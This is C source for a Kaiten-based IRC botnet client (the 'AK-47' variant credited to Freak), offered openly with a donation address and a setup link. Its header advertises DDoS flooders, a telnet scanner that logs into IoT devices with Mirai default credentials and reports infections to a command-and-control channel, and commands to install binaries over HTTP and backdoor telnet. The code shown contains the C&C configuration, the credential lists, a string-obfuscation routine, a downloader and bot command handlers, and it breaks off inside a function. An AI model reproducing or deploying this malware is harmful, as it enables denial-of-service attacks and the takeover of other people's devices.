
// https://hackforums.net/member.php?action=profile&uid=1657871 threatened to leak the code, so now im making it public

// hope his bitch ass wines
/*******************************************************************************
 * This is a remake of Kaiten, hacked together from various versions scattered *
 * throughout cyberspace. New features include a variety of awesome shell one- *
 * liners, ability to upgrade the knight over http (via gcc or binary), *
 * The LOCKUP command will kill telnetd and run a backdoor of your choice      *
 * (for simplicity we assume you will run it on port 23)                       *
 *                                                                             *
 * This bot is updated often, so check back frequently for new killer features *
 * and ddos tools. In memory of David Bowie, he was an awesome musician and    *
 * passed during the early development of this bot. By ShellzRuS and all the   *
 * other developers that have worked on Kaiten over the last 20 years.         *
 *                                                                             *
 *        "Hacking on kaiten is a right of passage" --Kod                      *
 *******************************************************************************
 *   This is a IRC based distributed denial of service client.  It connects to *
 * the server specified below and accepts commands via the channel specified.  *
 * The syntax is:                                                              *
 *       !<nick> <command>                                                     *
 * You send this message to the channel that is defined later in this code.    *
 * Where <nick> is the nickname of the client (which can include wildcards)    *
 * and the command is the command that should be sent.  For example, if you    *
 * want to tell all the clients with the nickname starting with N, to send you *
 * the help message, you type in the channel:                                  *
 *                                                                             *
 * This variant is special.                                                    *
 * It 7 DDoS methods in total!!!                                               *
 * It 2 non-spoofed UDP flooders, vanilla TCP connection flood and non spoofed *
 * TCP flood, packets are made up of random bytes, between 0x00 - 0xFF.        *
 * TCP has random packet size between 32 - 1024. It is extemely hard to block. *
 * it also has blacknurse! :D                                                  *
 * it also has 5 non root/non spoof attack methods in which ALL bots can run!  *
 * I have added the AK-47 telnet scanner which I coded myself.                 *
 * It now uses mirai default IoT device username and password combinations     *
 * it also uses the Mirai IP range generator to increase scanning speed.       *
 * FBI IP RANGES ARE NOW BLOCKED!                                              *
 * The scanner now calls to shell before sending the infection payloads        *
 * the scanner starts a new fork() for each CPU core. (not by me)              *
 * And increases sockets according to how many CPUs exist.                     *
 * the scanner also reports all cracked telnet credentials and successful      *
 * infections to the main command and control channel.                         *
 *                                                                             *
 * Successes:                                                                  *
 * [AK-47] [+] CRACKED ---> [username:password:1.2.3.4:23]                     *
 * [AK-47] [+] SUCCESSFUL INFECTION ---> [username:password:1.2.3.4:23]        *
 *                                                                             *
 *                                                                             *
 * The scanner is started once connected to the server.                        *
 * This way your bots only scan when they are connected, so                    *
 * if your server is down, they wont scan. And it will appear as if your net   *
 * got killed but they will still attempt to connect to your server(s)         *
 * and start the scanner again if they are able to connect                     *
 *                                                                             *
 * I have also added an advanced process name based botkiller.                 *
 * The botkiller tries to find the bot, then kills it also, not to mention if  *
 * it exists on the HDD the bot that was killed gets deleted.                  *
 * NO shell commands are required for the botkiller!                           *
 * Also the botnet can detect 15 different architectures :)                    *
 * All bot nicknames are PREFIX|ARCH|RANDID. Examples:                         *
 * [BOT|MIPS]Jg6dug or [BOT|x86_64]kA79aLOi, etc.                              *
 * Bot IDs are rand 4 - 8 alphanumeric charactars.                             *
 * where PREFIX is what you specify, ARCH is the architecture.                 *
 * RANDID is the bot suffix / ID.                                              *
 *       !N* HELP                                                              *
 * That will send you a list of all the commands.  You can also specify an     *
 * astrick alone to make all client do a specific command:                     *
 *       !* SH uname -a                                                        *
 * There are a large number of commands that can be sent to the client:        *
 *                                                                             *
 * Non-spoof / non-root attacks: (can run on all bots)                         *
 *       UDP <ip> <port> <time>      = A non spoof UDP HIV STD flooder         *
 *       HOLD <host> <port> <time>   = A vanilla TCP connection flooder        *
 *       JUNK <host> <port> <time>   = A vanilla TCP flooder (modded)          *
 *       UNKNOWN <target> <port, 0 for random> <packet size, 0 for random> <secs>  = Another non-spoof udp flooder
 *       HTTP <method> <target> <port> <path> <time> <power> = An extremely powerful HTTP flooder
 *                                                                             *
 * Spoof / root attacks:                                                       *
 *       DNS <target IP> <port> <reflection file url> <forks> <pps limiter, -1 for no limit> <time> = DNS amplification flooder, use with caution
 *       BLACKNURSE <target ip> <secs> = An ICMP flooder that will crash most firewalls, causing them to drop packets.
 *                                                                             *
 * Bot commands:                                                               *
 *       AK-47SCAN <ON/OFF>          = Toggles scanner. Started automatically. *
 *       GETIP <iface> = gets the IP address from an interface                 *
 *       FASTFLUX <iface> <ip> <port> = starts a proxy to a port on another ip to an interface (same port)
 *       RNDNICK                     = Randomizes knight nickname              *
 *       NICK <nick>                 = Changes the nick of the client          *
 *       SERVER <server>             = Changes servers                         *
 *       GETSPOOFS                   = Gets the current spoofing               *
 *       SPOOFS <subnet>             = Changes spoofing to a subnet            *
 *       DISABLE                     = Disables all packeting from the knight  *
 *       ENABLE                      = Enables all packeting from the knight   *
 *       KILL                        = Kills the knight                        *
 *       GET <http address> <save as> = Downloads a file off the web           *
 *       VERSION                     = Requests version of knight              *
 *       KILLALL                     = Kills all current packeting             *
 *       HELP                        = Displays this                           *
 *       IRC <command>               = Sends this command to the server        *
 *       SH <command>                = Executes a command                      *
 *       BASH <command>              = Run a bash command                      *
 *       ISH <command>               = Interactive SH (via privmsg)            *
 *       SHD <command>               = Daemonize command                       *
 *       INSTALL <http://server/bin> = Install binary (via wget)               *
 *       BINUPDATE <http://server/bin> = Update a binary (via wget)            *
 *       LOCKUP <http://server/bin>  = Kill telnet, install a backdoor!        *
 *                                                                             *
 * Remember, all these commands must be prefixed by ! and the bot ID that you  *
 * want the command to be sent to (can include wildcards).                     *
 * spaces in between the ! and the nickname, and there are no spaces before    *
 * the !                                                                       *
 *                                                                             *
 *            #keksec                                  #kektheplanet           *
 *                                                                             *
 *            - come on irc.anonplus.org - Leonidus, IrishSec, Freak           *
 *                                                                             *
 *            *NEW* Setup tutorial! https://pastebin.com/FXhvpn0D              *
 *                                                                             *
 *  Kaiten variant coded by Freak aka Milenko aka whateverthefuckyouknowmeas   *
 *                             HACK THE PLANET                                 *
 *                                                                             *
 *                   Donate BTC so i has moar monies ^_^ THX                   *
 *                     1Ae29RaTEYNBb4XGeqBnVMy4b6sURQ21dj                      *
 *                                                                             *
 *  All code will be updated here. To contribute message me on Jabber / XMPP   *
 *            Jabber/XMPP: Freak@420blaze.it                                 *
 *            Code was last updated on: Thursday, August 16th, 2018            *
 *                                                                             *
 *******************************************************************************/
////////////////////////////////////////////////////////////////////////////////
//                                EDIT THESE                                  //
////////////////////////////////////////////////////////////////////////////////
char encodes[] = { 
	'x', 'm', '@', '_', ';', 'w', ',', 'B', '-', 'Z', '*', 'j', '?', 'n', 'v', 'E', 
	'|', 's', 'q', '1', 'o', '$', '3', '"', '7', 'z', 'K', 'C', '<', 'F', ')', 'u', 
	't', 'A', 'r', '.', 'p', '%', '=', '>', '4', 'i', 'h', 'g', 'f', 'e', '6', 'c', 
	'b', 'a', '~', '&', '5', 'D', 'k', '2', 'd', '!', '8', '+', '9', 'U', 'y', ':'
	
};
char decodes[] = { 
	'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 
	'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 
	'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',
	'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '.', ' '
};
char decoded[512];

char *decode(char *str)
{
	int x = 0, i = 0, c;

	memset(decoded, 0, sizeof(decoded));
	while(x < strlen(str))
	{
		for(c = 0; c <= sizeof(encodes); c++)
		{
			if(str[x] == encodes[c])
			{
				decoded[i] = decodes[c];
				i++;
			}
		}
		x++;
	}
	decoded[i] = '\0';

	return decoded;
}
#define MAINSERVER "gay"
#undef STARTUP                               // Start on startup?
#undef IDENT                                 // Only enable this if you absolutely have to
#define CHAN "#keksec"                          // Channel to join
#define KEY "ugay"                        // The key of the channel
#define PREFIX "KEK"                         // The NICK prefix
#define KILLER_REBIND_TELNET //lmao
//#define KILLER_REBIND_SSH //keks
#define KILLER_REBIND_HTTP //w00t!
int numservers = 1; // Must change this to equal number of servers down there
char *servers[] = { // List the servers in that format, always end in (void*)0
    MAINSERVER,
    (void *) 0
};
char * SCANLISTENHOST = MAINSERVER; //our loader host
int SCANLISTENPORT = 8080; //ncat port
char * SNIFFLISTENHOST = MAINSERVER; //our loader host
int SNIFFLISTENPORT = 1337; //ncat port


const char *knownBots[] = { // known bots for memory based botkillr
    '584D4E4E43504622', //upx botkill
    '2F6465762F6D6973632F7761746368646F67', //mirai botkill (backdoor botkill???)
    'DEADBEEF', //mirai botkill 1
    '4E4B5156474C4B4C450256574C1222', //mirai botkill 2
    '4C4F4C4E4F4754464F', //qbot botkill 1
    '212A20445550', //qbot botkill 2
    '5453554E414D49', //ziggy botkill
    '50414E20', //ziggy botkill
    '7A6F6C6C617264', //zollard
    '5245504F52542025733A' //generic report botkill
};


////////////////////////////////////////////////////////////////////////////////
//                               STOP HERE!                                   //
////////////////////////////////////////////////////////////////////////////////
#include <stdarg.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <strings.h>
#include <unistd.h>
#include <dirent.h>
#include <poll.h>
#include <netdb.h>
#include <time.h>
#include <net/if.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <resolv.h>
//amp setting
#define MAX_PACKET_SIZE 1024
#define PHI 0x9e3779b9

//telnet scanner stuff
#define BUFFER_SIZE 1024
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254

#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12

#define OPT_SGA   3
#define SOCKBUF_SIZE 1024

//lil tool
#define NUMITEMS(x)  (sizeof(x) / sizeof((x)[0]))
#define gethostbyname(x) mygethostbyname(x)
#define KILLER_MIN_PID              400
#define KILLER_RESTART_SCAN_TIME    30
int util_strlen(char *);
int util_strncmp(char *, char *, int);
int util_strcmp(char *, char *);
int util_strcpy(char *, char *);
void util_memcpy(void *, void *, int);
void util_zero(void *, int);
int util_atoi(char *, int);
char *util_itoa(int, int, char *);
int util_memsearch(char *, int, char *, int);
int util_stristr(char *, int, char *);
char *util_fdgets(char *, int, int);

int util_isupper(char);
int util_isalpha(char);
int util_isspace(char);
int util_isdigit(char);

char *UserAgents[] = {
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
    "Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1",
    "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
    "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
    "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
    "Mozilla/5.0 (PLAYSTATION 3; 3.55)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2",
    "wii libnup/1.0",
    "Mozilla/4.0 (PSP (PlayStation Portable); 2.00)",
    "PSP (PlayStation Portable); 2.00",
    "Bunjalloo/0.7.6(Nintendo DS;U;en)",
    "Doris/1.15 [en] (Symbian)",
    "BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100",
    "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
    "Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01",
    "Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0",
    "SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
    "MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0",
    "Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
    "Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000",
    "MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1"
};

char *usernames[] = {
    "\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "root\0",
    "admin\0",
    "root\0",
    "default\0",
    "user\0",
    "guest\0",
    "daemon\0",
    "admin\0",
    "admin\0",
    "root\0",
    "admin\0",
    "adm\0",
    "guest\0",
    "root\0",
    "root\0",
    "telnet\0",
    "root\0",
    "admin\0",
    "admin\0",
    "Administrator\0",
    "root\0",
    "mg3500\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "default\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "admin1\0",
    "ubnt\0",
    "support\0",
    "root\0",
    "user\0",
    "guest\0",
	"admin\0",
	"admin\0",
	"admin\0"
};

char *passwords[] = {
    "\0",
    "root\0",
    "password\0",
    "\0",
    "Zte521\0",
    "vizxv\0",
    "000000\0",
    "14567\0",
    "hi3518\0",
    "user\0",
    "pass\0",
    "admin14\0",
    "7ujMko0admin\0",
    "00000000\0",
    "<>\0",
    "klv1\0",
    "klv14\0",
    "oelinux1\0",
    "realtek\0",
    "1111\0",
    "54321\0",
    "antslq\0",
    "zte9x15\0",
    "system\0",
    "1456\0",
    "888888\0",
    "ikwb\0",
    "default\0",
    "juantech\0",
    "xc3511\0",
    "support\0",
    "1111111\0",
    "service\0",
    "145\0",
    "4321\0",
    "tech\0",
    "<>\0",
    "abc1\0",
    "7ujMko0admin\0",
    "switch\0",
    "admin14\0",
    "\0",
    "1111\0",
    "meinsm\0",
    "pass\0",
    "smcadmin\0",
    "14567890\0",
    "14\0",
    "admin1\0",
    "password\0",
    "admin\0",
    "anko\0",
    "xc3511\0",
    "1456\0",
    "\0",
    "guest\0",
    "145\0",
    "xc3511\0",
    "admin\0",
    "Zte521\0",
    "\0",
    "user\0",
    "guest\0",
    "\0",
    "password\0",
    "admin1\0",
    "ikwb\0",
    "14567890\0",
    "\0",
    "\0",
    "1456\0",
    "root\0",
    "telnet\0",
    "zte9x15\0",
    "meinsm\0",
    "\0",
    "\0",
    "antslq\0",
    "merlin\0",
    "switch\0",
    "7ujMko0admin\0",
    "abc1\0",
    "<>\0",
    "tech\0",
    "4321\0",
    "default\0",
    "145\0",
    "service\0",
    "1111111\0",
    "admin14\0",
    "pass\0",
    "user\0",
    "hi3518\0",
    "password\0",
    "ubnt\0",
    "zlxx.\0",
    "14567\0",
    "000000\0"
	"wbox123\0",
	"1111111\0",
	"fliradmin\0",
	"jcv"
};

int scanPid = 0;

char *advances[] = {
    ":",
    "ser",
    "ogin",
    "name",
    "pass",
    "dvrdvs",
    (char *) 0
};
char *fails[] = {
    "nvalid",
    "ailed",
    "ncorrect",
    "enied",
    "error",
    "goodbye",
    "bad",
    "timeout",
    (char *) 0
};
char *successes[] = {
    "$",
    "#",
    ">",
    "@",
    "shell",
    "dvrdvs",
    "usybox",
    (char *) 0
};
char *advances2[] = {
    "nvalid",
    "ailed",
    "ncorrect",
    "enied",
    "rror",
    "oodbye",
    "bad",
    "busybox",
    "$",
    "#",
    (char *) 0
};
char *legit[] = {
    "AK47",
    (char *) 0
};

struct telstate_t {
    int fd;
    unsigned int ip;
	int port;
    unsigned char state;
    unsigned char complete;
    unsigned char usernameInd; /* username     */
    unsigned char passwordInd; /* password     */
    unsigned int totalTimeout; /* totalTimeout */
    char *sockbuf;
};

struct ipstate_t {
    int fd;
    unsigned int ip;
    unsigned char state;
    unsigned char complete;
    unsigned char usernameInd;
    unsigned char passwordInd;
    unsigned int totalTimeout;
    unsigned int telPort;
    char *sockbuf;
};

int sock, changeservers = 0;
int * pids, actualparent;
char *server, * chan, * key, * nick, * ident, * user, disabled = 0, execfile[256], dispass[256];

//unsigned int *pids;
unsigned long spoofs = 0, spoofsm = 0, numpids = 0;

char *getBuild() { //Get current architecture, detectx nearly every architecture. Coded by Freak
    #if defined(__x86_64__) || defined(_M_X64)
    return "x86_64";
    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "x86_32";
    #elif defined(__ARM_ARCH_2__)
    return "ARM2";
    #elif defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__)
    return "ARM3";
    #elif defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "ARM4T";
    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "ARM5"
    #elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_)
    return "ARM6T2";
    #elif defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__)
    return "ARM6";
    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "ARM7";
    #elif defined(__aarch64__)
    return "ARM64";
    #elif defined(mips) || defined(__mips__) || defined(__mips)
    return "MIPS";
    #elif defined(__sh__)
    return "SUPERH";
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
    return "POWERPC";
    #elif defined(__sparc__) || defined(__sparc)
    return "SPARC";
    #elif defined(__m68k__)
    return "M68K";
    #else
    return "UNKNOWN";
    #endif
}

u_char rseed[4096];
int rsi, rnd, pid;

// Calculates the checksum of the ip header.
unsigned short csum(unsigned short * ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += * ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *)&oddbyte) = * (u_char *) ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum&0xffff);
    sum = sum + (sum >> 16);
    answer = (short) ~sum;
    return (answer);
}

int strwildmatch(const char *pattern,
    const char *string) {
    switch ( * pattern) {
    case '\0':
        return *string;
    case '*':
        return !(!strwildmatch(pattern + 1, string) || * string && !strwildmatch(pattern, string + 1));
    case '?':
        return !( * string && !strwildmatch(pattern + 1, string + 1));
    default:
        return !((toupper( * pattern) == toupper( * string)) && !strwildmatch(pattern + 1, string + 1));
    }
}

int Send(int sock, char *words, ...) {
    char textBuffer[1024];
    va_list args;
    va_start(args, words);
    vsprintf(textBuffer, words, args);
    va_end(args);
    return write(sock, textBuffer, strlen(textBuffer));
}

int mfork(char *sender) {
    unsigned int parent, * newpids, i;
    if (disabled == 1) {
        Send(sock, "NOTICE %s :Unable to comply.\n", sender);
        return 1;
    }
    parent = fork();
    if (parent <= 0) return parent;
    numpids++;
    newpids = (unsigned int * ) malloc((numpids + 1) * sizeof(unsigned int));
    for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
    newpids[numpids - 1] = parent;
    free(pids);
    pids = newpids;
    return parent;
}

void filter(char *a) {
    while (a[strlen(a) - 1] == '\r' || a[strlen(a) - 1] == '\n') a[strlen(a) - 1] = 0;
}

char *randstring(int length) {
    srand(time(NULL));
    char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    size_t stringLen = 26 * 2 + 10;
    char *randomString;

    randomString = malloc(sizeof(char) * (length + 1));

    if (!randomString) {
        return (char *) 0;
    }

    unsigned int key = 0;

    int n;

    for (n = 0; n < length; n++) {
        key = rand() % stringLen;
        randomString[n] = charset[key];
    }

    randomString[length] = '\0';

    return randomString;
}

void identd() {
    int sockname, sockfd, sin_size, tmpsock, i;
    struct sockaddr_in my_addr, their_addr;
    char szBuffer[1024];
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) return;
    my_addr.sin_family = AF_INET;
    my_addr.sin_port = htons(113);
    my_addr.sin_addr.s_addr = INADDR_ANY;
    memset(&(my_addr.sin_zero), 0, 8);
    if (bind(sockfd, (struct sockaddr * )&my_addr, sizeof(struct sockaddr)) == -1) return;
    if (listen(sockfd, 1) == -1) return;
    if (fork() == 0) return;
    sin_size = sizeof(struct sockaddr_in);
    if ((tmpsock = accept(sockfd, (struct sockaddr * )&their_addr,&sin_size)) == -1) exit(0);
    for (;;) {
        fd_set bla;
        struct timeval timee;
        FD_ZERO(&bla);
        FD_SET(tmpsock,&bla);
        timee.tv_sec = timee.tv_usec = 60;
        if (select(tmpsock + 1,&bla, (fd_set * ) 0, (fd_set * ) 0,&timee) < 0) exit(0);
        if (FD_ISSET(tmpsock,&bla)) break;
    }
    i = recv(tmpsock, szBuffer, 1024, 0);
    if (i <= 0 || i >= 20) exit(0);
    szBuffer[i] = 0;
    if (szBuffer[i - 1] == '\n' || szBuffer[i - 1] == '\r') szBuffer[i - 1] = 0;
    if (szBuffer[i - 2] == '\n' || szBuffer[i - 2] == '\r') szBuffer[i - 2] = 0;
    Send(tmpsock, "%s : USERID : UNIX : %s\n", szBuffer, ident);
    close(tmpsock);
    close(sockfd);
    exit(0);
}

long poww(long a, long b) {
    if (b == 0) return 1;
    if (b == 1) return a;
    return a * poww(a, b - 1);
}

u_short in_cksum(u_short * addr, int len) {
    register int nleft = len;
    register u_short * w = addr;
    register int sum = 0;
    u_short answer = 0;
    while (nleft > 1) {
        sum += * w++;
        nleft -= 2;
    }
    if (nleft == 1) {
        *(u_char *)(&answer) = * (u_char *) w;
        sum += answer;
    }
    sum = (sum >> 16) + (sum&0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}

char *mygethostbyname(char *hostname) {
    int sockfd;
    struct addrinfo hints, * servinfo, * p;
    struct sockaddr_in * h;
    int rv;

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if ((rv = getaddrinfo(hostname, "80",&hints,&servinfo)) != 0) {
        return 1;
    }

    // loop through all the results and connect to the first we can
    for (p = servinfo; p != NULL; p = p->ai_next) {
        h = (struct sockaddr_in * ) p->ai_addr;
        return inet_ntoa(h->sin_addr);
    }

    freeaddrinfo(servinfo); // all done with this structure
    return 0;
}

int download(char *url, char *saveas) {
    int sock2, i, d;
    struct sockaddr_in server;
    unsigned long ipaddr;
    char buf[1024];
    FILE * file;
    char bufm[4096];
    if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        return 3;
    }
    if (!strncmp(url, "http://", 7)) strcpy(buf, url + 7);
    else strcpy(buf, url);
    for (i = 0; i < strlen(buf) && buf[i] != '/'; i++);
    buf[i] = 0;
    server.sin_family = AF_INET;
    server.sin_port = htons(80);
    if ((ipaddr = inet_addr(buf)) == -1) {
        struct hostent * hostm;
        if ((hostm = gethostbyname(buf)) == NULL) {
            return 2;
        }
        memcpy((char *)&server.sin_addr, hostm->h_addr, hostm->h_length);
    } else server.sin_addr.s_addr = ipaddr;
    memset(&(server.sin_zero), 0, 8);
    if (connect(sock2, (struct sockaddr * )&server, sizeof(server)) != 0) {
        return 1;
    }
    Send(sock2, "GET /%s HTTP/1.1\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: */*\r\nConnection: Keep-Alive\r\n\r\n", buf + i + 1, buf);
    file = fopen(saveas, "wb");
    while (1) {
        int i;
        if ((i = recv(sock2, bufm, 4096, 0)) <= 0) break;
        if (i < 4096) bufm[i] = 0;
        for (d = 0; d < i; d++)
            if (!strncmp(bufm + d, "\r\n\r\n", 4)) {
                for (d += 4; d < i; d++) fputc(bufm[d], file);
                goto downloaded;
            }
    }
    downloaded:
        while (1) {
            int i, d;
            if ((i = recv(sock2, bufm, 4096, 0)) <= 0) break;
            if (i < 4096) bufm[i] = 0;
            for (d = 0; d < i; d++) fputc(bufm[d], file);
        }
    fclose(file);
    close(sock2);
    return 0;
}

void get(int sock, char *sender, int argc, char ** argv) {
    if (mfork(sender) != 0) return;
    if (argc < 2) {
        Send(sock, "NOTICE %s :GET <host> <save as>\n", sender);
        exit(0);
    }
    int result = 0;
    result = download(argv[1], argv[2]);
    if (result == 3) {
        Send(sock, "NOTICE %s :Unable to create socket.\n", sender);
    } else if (result == 2) {
        Send(sock, "NOTICE %s :Unable to resolve address.\n", sender);
    } else if (result == 1) {
        Send(sock, "NOTICE %s :Unable to connect to http.\n", sender);
    } else if (result == 0) {
        Send(sock, "NOTICE %s :Saved as %s\n", sender, argv[2]);
    }
    exit(0);
}

void nickc(int sock, char *sender, int argc, char ** argv) {
    if (argc != 1) {
        Send(sock, "NOTICE %s :NICK <nick>\n", sender);
        return;
    }
    if (strlen(argv[1]) >= 33) {
        Send(sock, "NOTICE %s :Nick cannot be larger than 32 characters.\n", sender);
        return;
    }
    nick = argv[1];
    Send(sock, "NICK %s\n", argv[1]);
}

int realrand(int low, int high) {
    srand(time(NULL) + getpid());
    return (rand() % (high + 1 - low) + low);
}

void rndnick(int sock, char *sender, int argc, char ** argv) {
    nick = randstring(realrand(8, 16));
    Send(sock, "NICK [%s|%s]%s\n", PREFIX, getBuild(), nick);
}

void disable(int sock, char *sender, int argc, char ** argv) {
    if (argc != 1) {
        Send(sock, "NOTICE %s :DISABLE <pass>\n", sender);
        Send(sock, "NOTICE %s :Current status is: %s\n", sender, disabled ? "Disabled" : "Enabled and awaiting orders");
        return;
    }
    if (disabled) {
        Send(sock, "NOTICE %s :Already disabled.\n", sender);
        return;
    }
    if (strlen(argv[1]) > 254) {
        Send(sock, "NOTICE %s :Password too long! > 254\n", sender);
        return;
    }
    disabled = 1;
    memset(dispass, 0, 256);
    strcpy(dispass, argv[1]);
    Send(sock, "NOTICE %s :Disable sucessful.\n");
}

void enable(int sock, char *sender, int argc, char ** argv) {
    if (argc != 1) {
        Send(sock, "NOTICE %s :ENABLE <pass>\n", sender);
        Send(sock, "NOTICE %s :Current status is: %s\n", sender, disabled ? "Disabled" : "Enabled and awaiting orders");
        return;
    }
    if (!disabled) {
        Send(sock, "NOTICE %s :Already enabled.\n", sender);
        return;
    }
    if (strcasecmp(dispass, argv[1])) {
        Send(sock, "NOTICE %s :Wrong password\n", sender);
        return;
    }
    disabled = 0;
    Send(sock, "NOTICE %s :Password correct.\n", sender);
}

unsigned int host2ip(char *sender, char *hostname) {
    struct in_addr i;
    struct hostent * h;
    if ((i.s_addr = inet_addr(hostname)) == -1) {
        if ((h = gethostbyname(hostname)) == NULL) {
            Send(sock, "NOTICE %s :Unable to resolve %s\n", sender, hostname);
            exit(0);
        }
        bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
    }
